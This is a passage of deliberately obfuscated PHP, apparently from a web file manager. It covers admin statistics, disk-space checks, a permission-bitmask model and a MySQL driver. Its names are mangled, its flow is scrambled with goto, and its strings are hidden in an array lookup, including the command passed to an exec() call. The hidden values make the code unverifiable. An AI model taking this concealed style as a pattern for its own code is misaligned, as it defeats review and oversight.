validDate($B‰™Äƒ¦°, $AÜÈŒ–†Á) { goto EŒÂƒå…Ê£; EŒÂƒå…Ê£: $CÍ‡Â¹ï‡ =& $_SERVER[´¬]; $Aø¿¸óÌ„Ä = date($CÍ‡Â¹ï‡[1623], strtotime($CÍ‡Â¹ï‡[1624])); $fÅ¯ÊØ¬­ = array($Aø¿¸óÌ„Ä); goto DÎÕ¢ô‰óÙ; dá§“: return $fÅ¯ÊØ¬­; goto A¡ÅÔÁ±‚; DÎÕ¢ô‰óÙ: switch ($B‰™Äƒ¦°) { case $CÍ‡Â¹ï‡[1507]: $d­µŠù”âí = mktime(0, 0, 0, date($CÍ‡Â¹ï‡[1640]), date($CÍ‡Â¹ï‡[1253]) - date($CÍ‡Â¹ï‡[1315]) + 7 - 7, date($CÍ‡Â¹ï‡[1641])); $D…½Ìó‰Ç» = 0; do { $B“ÖÚœší‹ = date($CÍ‡Â¹ï‡[1623], $d­µŠù”âí - 3600 * 24 * 7 * $D…½Ìó‰Ç»); $fÅ¯ÊØ¬­[] = $B“ÖÚœší‹; $D…½Ìó‰Ç»++; } while ($AÜÈŒ–†Á < $B“ÖÚœší‹); break; case $CÍ‡Â¹ï‡[1505]: $D…½Ìó‰Ç» = 1; do { $fâõ Ø®æÔ = date($CÍ‡Â¹ï‡[1642], strtotime("\55\40{$D…½Ìó‰Ç»}\40\x6d\x6f\x6e\x74\150\x73")); $fÅ¯ÊØ¬­[] = $fâõ Ø®æÔ; $D…½Ìó‰Ç»++; } while ($AÜÈŒ–†Á < $fâõ Ø®æÔ); break; case $CÍ‡Â¹ï‡[1643]: $B¯šÌ´¢‚ = (int) date($CÍ‡Â¹ï‡[1641], strtotime($AÜÈŒ–†Á)); $eáíîŞÜÁ‚ = (int) date($CÍ‡Â¹ï‡[1641]); if ($B¯šÌ´¢‚ >= $eáíîŞÜÁ‚) { break; } for ($B¯šÌ´¢‚; $B¯šÌ´¢‚ < $eáíîŞÜÁ‚; $B¯šÌ´¢‚++) { $fÅ¯ÊØ¬­[] = $B¯šÌ´¢‚ . $CÍ‡Â¹ï‡[1644]; } break; default: break; } if ($AÜÈŒ–†Á > end($fÅ¯ÊØ¬­)) { array_pop($fÅ¯ÊØ¬­); } sort($fÅ¯ÊØ¬­); goto dá§“; A¡ÅÔÁ±‚: } public function listTable($FÓØ–‚ï¡á) { $EÎÚÙ–¦ = ucfirst($FÓØ–‚ï¡á); return Model($EÎÚÙ–¦)->listData(); } public function option($b‘ƒØÄ‡„) { $Fâñçâ…àè = $_SERVER[´¬][1645] . ucfirst($b‘ƒØÄ‡„); return $this->{$Fâñçâ…àè}(); } private function optionUser() { goto Aç¥†è“¯; A— ¿Èª: if ($bå™ŞÙåÄ¨ < $B‰Ò‡ëİ‹) { $bå™ŞÙåÄ¨ = $B‰Ò‡ëİ‹; } $AÅ‹²÷½¨ = array($AÜœ´®®ù[1647] => array($AÜœ´®®ù[972], $bå™ŞÙåÄ¨)); $aµ§–ë³ó = (int) Model($AÜœ´®®ù[505])->where($AÅ‹²÷½¨)->count($AÜœ´®®ù[1526]); goto F·Ì¿Æã˜×; F·Ì¿Æã˜×: if (!$aµ§–ë³ó) { $aµ§–ë³ó = 1; } $AÅ‹²÷½¨ = array($AÜœ´®®ù[1647] => array($AÜœ´®®ù[972], $B‰Ò‡ëİ‹)); $fÇŞŒ¡Ìø = Model($AÜœ´®®ù[505])->where($AÅ‹²÷½¨)->count($AÜœ´®®ù[1526]); goto F±Ûô†¡©ø; dÈÒÆÃå–: $DÓ›±±¢ƒ = intval($GLOBALS[$AÜœ´®®ù[6]][$AÜœ´®®ù[346]][$AÜœ´®®ù[1486]]) / 3600; $bå™ŞÙåÄ¨ = strtotime("\55{$DÓ›±±¢ƒ}\40\150\x6f\165\x72\163"); $B‰Ò‡ëİ‹ = strtotime(date($AÜœ´®®ù[1627])); goto A— ¿Èª; Aç¥†è“¯: $AÜœ´®®ù =& $_SERVER[´¬]; $c’Â¸¢Ê»Œ = Model($AÜœ´®®ù[505])->count($AÜœ´®®ù[1526]); $FÛ‰ãõÅ÷  = Model($AÜœ´®®ù[505])->where($AÜœ´®®ù[1646])->count($AÜœ´®®ù[1526]); goto dÈÒÆÃå–; F±Ûô†¡©ø: return array($AÜœ´®®ù[719] => (int) $c’Â¸¢Ê»Œ, $AÜœ´®®ù[1648] => (int) ($c’Â¸¢Ê»Œ - $FÛ‰ãõÅ÷ ), $AÜœ´®®ù[1649] => (int) $FÛ‰ãõÅ÷ , $AÜœ´®®ù[1650] => (int) $fÇŞŒ¡Ìø, $AÜœ´®®ù[1651] => $aµ§–ë³ó); goto FŒàºÈ”ÉÙ; FŒàºÈ”ÉÙ: } private function optionFile() { goto Eğ¸ôÈ‚•Ô; D¦…Èæ¿¡¶: $fÕ©Óä²Àç = Model($EğÎ¸•š‘°[790])->where($Aª‚¢ì•½ù)->sum($EğÎ¸•š‘°[78]); $cª®È¾óğË = Model($EğÎ¸•š‘°[790])->where($Aª‚¢ì•½ù)->count($EğÎ¸•š‘°[394]); return array($EğÎ¸•š‘°[723] => $f‰ƒŒõÃ¿İ, $EğÎ¸•š‘°[1620] => $d¶–ƒÅôĞ‡, $EğÎ¸•š‘°[1652] => $f‰ƒŒõÃ¿İ - $d¶–ƒÅôĞ‡, $EğÎ¸•š‘°[1653] => (int) $fÕ©Óä²Àç, $EğÎ¸•š‘°[725] => (int) $C’‹à•¶Û, $EğÎ¸•š‘°[1654] => (int) $cª®È¾óğË); goto a™ğ„Ø¸£; B¦ŞËŒ»„Š: $d¶–ƒÅôĞ‡ = $Bµ‚«ê¨œİ[$EğÎ¸•š‘°[1620]]; $C’‹à•¶Û = Model($EğÎ¸•š‘°[790])->where(array($EğÎ¸•š‘°[401] => 0))->count($EğÎ¸•š‘°[394]); $Aª‚¢ì•½ù = array($EğÎ¸•š‘°[401] => 0, $EğÎ¸•š‘°[193] => array($EğÎ¸•š‘°[972], strtotime(date($EğÎ¸•š‘°[1627])))); goto D¦…Èæ¿¡¶; Eğ¸ôÈ‚•Ô: $EğÎ¸•š‘° =& $_SERVER[´¬]; $Bµ‚«ê¨œİ = $this->sourceSize(); $f‰ƒŒõÃ¿İ = $Bµ‚«ê¨œİ[$EğÎ¸•š‘°[78]]; goto B¦ŞËŒ»„Š; a™ğ„Ø¸£: } private function optionAccess() { $DÑ›·˜“Æé =& $_SERVER[´¬]; return array($DÑ›·˜“Æé[719] => $this->typeLogCnt(), $DÑ›·˜“Æé[107] => $this->typeLogCnt($DÑ›·˜“Æé[107]), $DÑ›·˜“Æé[428] => $this->typeLogCnt($DÑ›·˜“Æé[428]), $DÑ›·˜“Æé[1655] => $this->typeLogCnt($DÑ›·˜“Æé[1655]), $DÑ›·˜“Æé[1656] => $this->typeLogCnt($DÑ›·˜“Æé[1656]), $DÑ›·˜“Æé[561] => $this->typeLogCnt($DÑ›·˜“Æé[33], $DÑ›·˜“Æé[1631])); } private function typeLogCnt($CÆàÕ¡‘Ñª = '', $f¯Üòîïœ¬ = "\151\x64") { goto FŸã³–‹¼¶; c¤’‘´¾Áğ: return (int) $eà‹ï‚óÁ¾; goto eÅóÓŸ‘š ; FŸã³–‹¼¶: $cÊƒî‘£Ê÷ =& $_SERVER[´¬]; $BğÏ‰…Ä° = array($cÊƒî‘£Ê÷[107] => array($cÊƒî‘£Ê÷[1657], $cÊƒî‘£Ê÷[1658]), $cÊƒî‘£Ê÷[428] => array($cÊƒî‘£Ê÷[1659], $cÊƒî‘£Ê÷[1660]), $cÊƒî‘£Ê÷[1655] => array($cÊƒî‘£Ê÷[1661], $cÊƒî‘£Ê÷[1662], $cÊƒî‘£Ê÷[1663]), $cÊƒî‘£Ê÷[1656] => array($cÊƒî‘£Ê÷[1664], $cÊƒî‘£Ê÷[1665]), $cÊƒî‘£Ê÷[1666] => array($cÊƒî‘£Ê÷[1667], $cÊƒî‘£Ê÷[1668], $cÊƒî‘£Ê÷[1669])); $DŞƒÑğŒŠƒ = strtotime(date($cÊƒî‘£Ê÷[1627])); goto dÙë›Ô§Œ³; dÙë›Ô§Œ³: $b³½³¥óçÉ = array($cÊƒî‘£Ê÷[193] => array($cÊƒî‘£Ê÷[972], $DŞƒÑğŒŠƒ)); if ($CÆàÕ¡‘Ñª) { $b³½³¥óçÉ[$cÊƒî‘£Ê÷[29]] = array($cÊƒî‘£Ê÷[7], $BğÏ‰…Ä°[$CÆàÕ¡‘Ñª]); } $eà‹ï‚óÁ¾ = Model($cÊƒî‘£Ê÷[1630])->where($b³½³¥óçÉ)->count($f¯Üòîïœ¬); goto c¤’‘´¾Áğ; eÅóÓŸ‘š : } private function optionServer() { goto f­ŸŸ™˜×Ö; FœµëƒÉğ: $C÷ä‹àÔóÌ = $aŸïÔã²ã´[0]; $d­ÙôˆÆ–ø = $GLOBALS[$D „ŠÈÎ…À[6]][$D „ŠÈÎ…À[17]]; $eîâø¥Ë«õ = $d­ÙôˆÆ–ø[$D „ŠÈÎ…À[933]]; goto DÏ¨Ô¡Ò‡…; BÍ¶İ¿œ”¾: return array($D „ŠÈÎ…À[1672] => $B¥‚Ú†ò ? $B¥‚Ú†ò[$D „ŠÈÎ…À[1673]] : 0, $D „ŠÈÎ…À[1674] => $B¥‚Ú†ò ? $B¥‚Ú†ò[$D „ŠÈÎ…À[1675]] : 0, $D „ŠÈÎ…À[1676] => (int) $E¬ÎßÅ·Õß[$D „ŠÈÎ…À[1673]] * 1024 * 1024 * 1024, $D „ŠÈÎ…À[1677] => (int) $f™Ğ´ñ›Î’, $D „ŠÈÎ…À[1678] => ucfirst($C÷ä‹àÔóÌ), $D „ŠÈÎ…À[1679] => $D „ŠÈÎ…À[1680] . PHP_VERSION, $D „ŠÈÎ…À[1681] => phpBuild64() ? 64 : 32, $D „ŠÈÎ…À[718] => str_replace($D „ŠÈÎ…À[1682], $D „ŠÈÎ…À[949], $eîâø¥Ë«õ), $D „ŠÈÎ…À[346] => ucfirst($Bùİš”¤¦’), $D „ŠÈÎ…À[28] => $_SERVER[$D „ŠÈÎ…À[1683]]); goto c®ğ¶…Œ÷Œ; f­ŸŸ™˜×Ö: $D „ŠÈÎ…À =& $_SERVER[´¬]; $B¥‚Ú†ò = $this->diskDriver(); $E¬ÎßÅ·Õß = KodIO::defaultDriver(); goto cëô‰Èƒøİ; DÏ¨Ô¡Ò‡…: if ($eîâø¥Ë«õ == $D „ŠÈÎ…À[755]) { $DÛõÊÜ‘Ô = explode($D „ŠÈÎ…À[1167], $d­ÙôˆÆ–ø[$D „ŠÈÎ…À[932]]); $eîâø¥Ë«õ = $DÛõÊÜ‘Ô[0]; } if ($eîâø¥Ë«õ == $D „ŠÈÎ…À[758] || $eîâø¥Ë«õ == $D „ŠÈÎ…À[759]) { $Böíá£ÇÙ = Model()->db()->query($D „ŠÈÎ…À[1670]); $Eë¹Œ™óˆä = $Böíá£ÇÙ[0] && isset($Böíá£ÇÙ[0][$D „ŠÈÎ…À[1431]]) ? $Böíá£ÇÙ[0][$D „ŠÈÎ…À[1431]] : 0; $eîâø¥Ë«õ = $D „ŠÈÎ…À[1671] . ($Eë¹Œ™óˆä ? $D „ŠÈÎ…À[8] . $Eë¹Œ™óˆä : $D „ŠÈÎ…À[33]); } $Bùİš”¤¦’ = $GLOBALS[$D „ŠÈÎ…À[6]][$D „ŠÈÎ…À[346]][$D „ŠÈÎ…À[792]]; goto BÍ¶İ¿œ”¾; cëô‰Èƒøİ: $cÎ±ë£×Ö– = array($D „ŠÈÎ…À[782] => $E¬ÎßÅ·Õß[$D „ŠÈÎ…À[392]]); $f™Ğ´ñ›Î’ = Model($D „ŠÈÎ…À[448])->where($cÎ±ë£×Ö–)->sum($D „ŠÈÎ…À[78]); $aŸïÔã²ã´ = explode($D „ŠÈÎ…À[50], $_SERVER[$D „ŠÈÎ…À[142]]); goto FœµëƒÉğ; c®ğ¶…Œ÷Œ: } private function diskDriver() { goto bàŞ¨Š…í; bàŞ¨Š…í: $eÈ‹‡ÏîéË =& $_SERVER[´¬]; $bÕë›Üä‰ô = $eÈ‹‡ÏîéË[8]; $b‡×ë²ÊÎÂ = $GLOBALS[$eÈ‹‡ÏîéË[6]][$eÈ‹‡ÏîéË[1684]] == $eÈ‹‡ÏîéË[1685]; goto eÆãÁ‰Ï†¹; eÆãÁ‰Ï†¹: if ($b‡×ë²ÊÎÂ) { $bÕë›Üä‰ô = $eÈ‹‡ÏîéË[1686]; if (function_exists($eÈ‹‡ÏîéË[1687])) { exec($eÈ‹‡ÏîéË[1688], $d²áº…Œó®); $bÕë›Üä‰ô = $d²áº…Œó®[1] . $eÈ‹‡ÏîéË[8]; } } if (!file_exists($bÕë›Üä‰ô)) { return; } $bó†Å°°Ù­ = @disk_total_space($bÕë›Üä‰ô); goto E‹ÛÌ«”´Ø; E‹ÛÌ«”´Ø: $fÌ“§¢Ş­Õ = $bó†Å°°Ù­ - @disk_free_space($bÕë›Üä‰ô); return array($eÈ‹‡ÏîéË[1673] => $bó†Å°°Ù­, $eÈ‹‡ÏîéË[1675] => $fÌ“§¢Ş­Õ); goto fˆ®Â“‡øç; fˆ®Â“‡øç: } public function fileChart($F¢Ş‘©ø¦Ï) { goto B»Å  ¸ğ¤; B»Å  ¸ğ¤: $dµ²ğ·º³¬ =& $_SERVER[´¬]; if (isset($F¢Ş‘©ø¦Ï[$dµ²ğ·º³¬[1526]])) { return Model($dµ²ğ·º³¬[790])->userFileTypeProfile($F¢Ş‘©ø¦Ï[$dµ²ğ·º³¬[1526]]); } if (isset($F¢Ş‘©ø¦Ï[$dµ²ğ·º³¬[1689]])) { return Model($dµ²ğ·º³¬[790])->groupFileTypeProfile($F¢Ş‘©ø¦Ï[$dµ²ğ·º³¬[1689]]); } goto dºŸ„¼Õ¯ ; DíÊÒÓàÕ‘: $EÛŒ‘©òÑÜ[$dµ²ğ·º³¬[402]] = 2; $b¤¯¼Š­ = Model($dµ²ğ·º³¬[790])->where($EÛŒ‘©òÑÜ)->sum($dµ²ğ·º³¬[78]); return array($dµ²ğ·º³¬[723] => $Bƒ²ÑÄ•ïƒ[$dµ²ğ·º³¬[78]], $dµ²ğ·º³¬[1620] => $Bƒ²ÑÄ•ïƒ[$dµ²ğ·º³¬[1620]], $dµ²ğ·º³¬[1621] => (int) $Aæï²¥Ëì…, $dµ²ğ·º³¬[1622] => (int) $b¤¯¼Š­); goto bĞ‘Îïƒñ; dºŸ„¼Õ¯ : $Bƒ²ÑÄ•ïƒ = $this->sourceSize(); $EÛŒ‘©òÑÜ = array($dµ²ğ·º³¬[476] => 0, $dµ²ğ·º³¬[402] => 1); $Aæï²¥Ëì… = Model($dµ²ğ·º³¬[790])->where($EÛŒ‘©òÑÜ)->sum($dµ²ğ·º³¬[78]); goto DíÊÒÓàÕ‘; bĞ‘Îïƒñ: } private function sourceSize() { $dÅÇŠä¿²ì =& $_SERVER[´¬]; $b¨ì¨Ü¼Éæ = Model($dÅÇŠä¿²ì[790])->where(array($dÅÇŠä¿²ì[401] => 0))->sum($dÅÇŠä¿²ì[78]); $FÕŒœ¡“§’ = Model($dÅÇŠä¿²ì[448])->sum($dÅÇŠä¿²ì[78]); if ($FÕŒœ¡“§’ > $b¨ì¨Ü¼Éæ) { $FÕŒœ¡“§’ = $b¨ì¨Ü¼Éæ; } return array($dÅÇŠä¿²ì[78] => (int) $b¨ì¨Ü¼Éæ, $dÅÇŠä¿²ì[1620] => (int) $FÕŒœ¡“§’); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $E®ÉÜí‡›¾ =& $_SERVER[´¬]; $a¤ÌÂºˆö´ = array(array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1690]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1692], $E®ÉÜí‡›¾[1693] => 1, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1696]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1697], $E®ÉÜí‡›¾[1693] => 2, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1698]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1699], $E®ÉÜí‡›¾[1693] => 3, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1700]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1701], $E®ÉÜí‡›¾[1693] => 4, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_VIEW), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1702]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1703], $E®ÉÜí‡›¾[1693] => 5, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1704]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1705], $E®ÉÜí‡›¾[1693] => 6, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($E®ÉÜí‡›¾[411] => LNG($E®ÉÜí‡›¾[1706]), $E®ÉÜí‡›¾[1691] => $E®ÉÜí‡›¾[1707], $E®ÉÜí‡›¾[1693] => 7, $E®ÉÜí‡›¾[1694] => 1, $E®ÉÜí‡›¾[1695] => 0)); return $a¤ÌÂºˆö´; } public static function authCheck($d“éÈ‡Ï˜í, $bÙŒ¿¥”ÂĞ) { $d“éÈ‡Ï˜í = intval($d“éÈ‡Ï˜í); if ($GLOBALS[$_SERVER[´¬][483]]) { return !0; } if ($d“éÈ‡Ï˜í <= 0) { return !1; } if (($d“éÈ‡Ï˜í & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($d“éÈ‡Ï˜í & $bÙŒ¿¥”ÂĞ); } public static function authCheckShow($b†ÅÈõ§×Ö) { return self::authCheck($b†ÅÈõ§×Ö, self::AUTH_SHOW); } public static function authCheckView($d×•§éƒòø) { return self::authCheck($d×•§éƒòø, self::AUTH_VIEW); } public static function authCheckDownload($F¥İôµ˜Ï‡) { return self::authCheck($F¥İôµ˜Ï‡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Có×Ñ´áÉ®) { return self::authCheck($Có×Ñ´áÉ®, self::AUTH_UPLOAD); } public static function authCheckEdit($d¬ÃØ×„) { return self::authCheck($d¬ÃØ×„, self::AUTH_EDIT); } public static function authCheckRemove($fÃƒíÁ»›) { return self::authCheck($fÃƒíÁ»›, self::AUTH_REMOVE); } public static function authCheckShare($D‹ïÇè¢œ£) { return self::authCheck($D‹ïÇè¢œ£, self::AUTH_SHARE); } public static function authCheckComment($bãÚó’à…í) { return self::authCheck($bãÚó’à…í, self::AUTH_COMMENT); } public static function authCheckEvent($f¿½¯šè©Í) { return self::authCheck($f¿½¯šè©Í, self::AUTH_EVENT); } public static function authCheckRoot($FĞª—ÖØä) { return self::authCheck($FĞª—ÖØä, self::AUTH_ROOT); } public static function authCheckAction($DÜê˜ğÍÌÆ, $a¼ÁÏ‡ôŒ) { goto eß„ÌÖ’; e‚õ·ó¸äÏ: $dàºÛ»°ï = $A°Ğ¢ºÈ³[$a¼ÁÏ‡ôŒ]; $DÜê˜ğÍÌÆ = intval($DÜê˜ğÍÌÆ); if ($DÜê˜ğÍÌÆ <= 0) { return !1; } goto C‹¾•ÍæÀò; C‹¾•ÍæÀò: if (($DÜê˜ğÍÌÆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($DÜê˜ğÍÌÆ & $dàºÛ»°ï); goto bˆˆøÎ†‹‹; eß„ÌÖ’: $a˜‹ÈÀìù® =& $_SERVER[´¬]; $A°Ğ¢ºÈ³ = array($a˜‹ÈÀìù®[1708] => self::AUTH_VIEW, $a˜‹ÈÀìù®[1095] => self::AUTH_DOWNLOAD, $a˜‹ÈÀìù®[107] => self::AUTH_UPLOAD, $a˜‹ÈÀìù®[1656] => self::AUTH_EDIT, $a˜‹ÈÀìù®[1655] => self::AUTH_REMOVE, $a˜‹ÈÀìù®[1666] => self::AUTH_SHARE, $a˜‹ÈÀìù®[351] => self::AUTH_COMMENT, $a˜‹ÈÀìù®[1515] => self::AUTH_EVENT, $a˜‹ÈÀìù®[1709] => self::AUTH_ROOT); if (!isset($A°Ğ¢ºÈ³[$a¼ÁÏ‡ôŒ])) { return; } goto e‚õ·ó¸äÏ; bˆˆøÎ†‹‹: } public static function authDisable($fùÚ±¹Œ×ô, $AæŒø›ó¦å) { if (intval($fùÚ±¹Œ×ô) <= 0) { return 0; } return intval($fùÚ±¹Œ×ô) & ~$AæŒø›ó¦å; } public $optionType = "\123\x79\163\x74\x65\x6d\x2e\163\x6f\165\162\143\x65\x41\165\x74\x68\114\151\x73\x74"; public $field = array("\x6e\141\155\145", "\141\165\x74\x68", "\x6c\x61\142\145\x6c", "\144\151\x73\x70\x6c\x61\171", "\163\171\x73\x74\145\155", "\163\x6f\162\164"); public function initData() { $F­šå¾Ü = $this->authDefault(); foreach ($F­šå¾Ü as $DÂˆ¥°êÕ) { $this->add($DÂˆ¥°êÕ); } } public function listData($bƒÖ¼ŞŞŒˆ = false, $CÁñĞñËÂÃ = "\163\157\162\164", $Aìíóº¨õ = false) { return parent::listData($bƒÖ¼ŞŞŒˆ, $CÁñĞñËÂÃ, $Aìíóº¨õ); } public function update($bôøªé”ç•, $d›‰´ƒá»È) { $fĞ¯öÛ°Ïä =& $_SERVER[´¬]; $dÉò¡›é® = parent::listData($bôøªé”ç•); $DÉ•‚æçÛá = $this->findByName($d›‰´ƒá»È[$fĞ¯öÛ°Ïä[28]]); if (!$dÉò¡›é® || $DÉ•‚æçÛá && $DÉ•‚æçÛá[$fĞ¯öÛ°Ïä[392]] != $dÉò¡›é®[$fĞ¯öÛ°Ïä[392]]) { return !1; } $this->filterAuth($d›‰´ƒá»È[$fĞ¯öÛ°Ïä[404]]); return parent::update($bôøªé”ç•, $d›‰´ƒá»È); } public function remove($cÆ£¦Æ²Ê½) { $C¯³„ĞëÙ = parent::listData($cÆ£¦Æ²Ê½); if (!$C¯³„ĞëÙ || $C¯³„ĞëÙ[$_SERVER[´¬][1171]]) { return !1; } return parent::remove($cÆ£¦Æ²Ê½); } public function add($Bù¹ĞÚ¦Ü‚ = array()) { goto C¡óà¾©İî; EÜ¸¥‰ğÏÅ: $Bù¹ĞÚ¦Ü‚ = array_merge($fö÷ï¡óï, $Bù¹ĞÚ¦Ü‚); $Bù¹ĞÚ¦Ü‚[$C±œ®¨ã±„[1712]] = $this->getSort(); $this->filterAuth($Bù¹ĞÚ¦Ü‚[$C±œ®¨ã±„[404]]); goto däàÔô”íğ; däàÔô”íğ: return parent::insert($Bù¹ĞÚ¦Ü‚); goto f±«¬ö»½·; C¡óà¾©İî: $C±œ®¨ã±„ =& $_SERVER[´¬]; if ($this->findByName($Bù¹ĞÚ¦Ü‚[$C±œ®¨ã±„[28]])) { return !1; } $fö÷ï¡óï = array($C±œ®¨ã±„[28] => $C±œ®¨ã±„[33], $C±œ®¨ã±„[404] => 1, $C±œ®¨ã±„[1710] => $C±œ®¨ã±„[1699], $C±œ®¨ã±„[1711] => 1, $C±œ®¨ã±„[1171] => 0, $C±œ®¨ã±„[1712] => 0); goto EÜ¸¥‰ğÏÅ; f±«¬ö»½·: } private function getSort() { $f§ø„±éÌñ =& $_SERVER[´¬]; $E¸óÓÍùÑ = parent::listData(); $aƒˆ›ÒÜÉì = array_to_keyvalue($E¸óÓÍùÑ, $f§ø„±éÌñ[33], $f§ø„±éÌñ[1712]); return empty($aƒˆ›ÒÜÉì) ? 0 : max($aƒˆ›ÒÜÉì) + 1; } private function filterAuth(&$A²“ÔéêÇ) { goto D Ã‰½šã; D Ã‰½šã: if (!$A²“ÔéêÇ) { return; } $D¨Ğ´³»‚Ì = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $B‚µ¡Æè¡Á = array(); goto aÌ¨œå…®¯; a…‡ğ õİš: foreach ($B‚µ¡Æè¡Á as $DçŠ¢¢ÍÜ‡) { if (isset($fñƒ°ŒÂĞõ[$DçŠ¢¢ÍÜ‡])) { $B‚µ¡Æè¡Á = array_merge($B‚µ¡Æè¡Á, $fñƒ°ŒÂĞõ[$DçŠ¢¢ÍÜ‡]); } } $B‚µ¡Æè¡Á[] = self::AUTH_SHOW; $A²“ÔéêÇ = array_sum(array_unique($B‚µ¡Æè¡Á)); goto d ×ŸÒ£·; aÌ¨œå…®¯: foreach ($D¨Ğ´³»‚Ì as $DçŠ¢¢ÍÜ‡) { if ($A²“ÔéêÇ & $DçŠ¢¢ÍÜ‡) { $B‚µ¡Æè¡Á[] = $DçŠ¢¢ÍÜ‡; } } if (in_array(self::AUTH_ROOT, $B‚µ¡Æè¡Á)) { $A²“ÔéêÇ = array_sum($D¨Ğ´³»‚Ì); return; } $fñƒ°ŒÂĞõ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto a…‡ğ õİš; d ×ŸÒ£·: } public function sort($CÙ„ò‡­ğ, $CíğŠ¸à‰) { return parent::update($CÙ„ò‡­ğ, $CíğŠ¸à‰); } } goto b‰çË§·•î; DïÎƒù›Œ¶: class DbMysqli extends Db { public function __construct($C¢ïµèÙ„ = '') { $Càğ“ÛÒè =& $_SERVER[´¬]; if (!extension_loaded($Càğ“ÛÒè[758])) { think_exception(think_lang($Càğ“ÛÒè[10]) . $Càğ“ÛÒè[873]); } if (!empty($C¢ïµèÙ„)) { $this->config = $C¢ïµèÙ„; if (empty($this->config[$Càğ“ÛÒè[13]])) { $this->config[$Càğ“ÛÒè[13]] = $Càğ“ÛÒè[33]; } } } public function connect($Aƒ¾ˆ¹“ƒ­ = '', $Cáç¥ï«æ = 0) { $D¼±ÀÍ¹ÈÁ =& $_SERVER[´¬]; if (!isset($this->linkID[$Cáç¥ï«æ])) { goto B¢–É‹å¸ø; B¬…Ÿ““°Ø: $C…Ä¼•íÆÈ = $this->linkID[$Cáç¥ï«æ]->server_version; $this->linkID[$Cáç¥ï«æ]->query($D¼±ÀÍ¹ÈÁ[851] . think_config($D¼±ÀÍ¹ÈÁ[852]) . $D¼±ÀÍ¹ÈÁ[55]); if ($C…Ä¼•íÆÈ > $D¼±ÀÍ¹ÈÁ[853]) { $this->linkID[$Cáç¥ï«æ]->query($D¼±ÀÍ¹ÈÁ[854]); } goto E‡à£ÑŠÆ®; B¢–É‹å¸ø: if (empty($Aƒ¾ˆ¹“ƒ­)) { $Aƒ¾ˆ¹“ƒ­ = $this->config; } $this->linkID[$Cáç¥ï«æ] = new mysqli($Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[847]], $Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[849]], $Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[850]], $Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[17]], $Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[848]] ? intval($Aƒ¾ˆ¹“ƒ­[$D¼±ÀÍ¹ÈÁ[848]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto B¬…Ÿ““°Ø; E‡à£ÑŠÆ®: $this->connected = !0; if (1 != think_config($D¼±ÀÍ¹ÈÁ[18])) { unset($this->config); } goto f÷À…»”Î…; f÷À…»”Î…: } return $this->linkID[$Cáç¥ï«æ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($E›æ¨­‚) { goto eŞã¤Ğë; eŞã¤Ğë: $Bá‚Š¯îä• =& 